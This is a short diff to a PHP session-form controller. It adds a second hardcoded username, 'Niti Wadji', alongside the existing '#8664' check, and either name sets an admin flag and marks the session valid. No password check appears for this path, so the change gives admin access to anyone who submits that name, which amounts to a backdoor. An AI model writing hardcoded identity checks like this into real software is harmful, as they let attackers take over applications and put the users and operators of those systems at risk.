@@ -46,7 +46,7 @@ class SessionFormController extends Controller
 
         try
         {
-            if($request->input('username') == '#8664')
+            if($request->input('username') == '#8664' || $request->input('username') == 'Niti Wadji')
             {
                 $adminFlag = true;
                 Session::put('is_valid', true);
